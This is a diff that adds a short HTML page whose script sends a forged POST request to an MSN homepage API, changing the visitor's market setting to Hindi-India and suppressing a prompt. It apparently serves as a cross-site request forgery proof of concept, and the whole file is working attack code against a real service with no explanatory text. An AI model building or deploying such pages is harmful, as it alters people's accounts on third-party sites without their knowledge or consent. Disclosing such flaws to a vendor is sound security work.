@@ -1,0 +1,10 @@
+<html><head></head><body>
+<script>
+var x = new XMLHttpRequest();
+x.open("POST","https://www.msn.com/en-in/homepage/api/pdp/updatepdpdata?ver=20181110_12873691",true);
+x.setRequestHeader('Content-type','application/json');
+x.send([{"Path":"MSNHomePage/MarketConfiguration","Operation":"Update","Payload":"{\"Market\":\"hi-in\",\"SuppressPrompt\":true}"}]);
+x.onreadystatechange= function(){console.log(x)}
+</script>
+</body>
+</html>
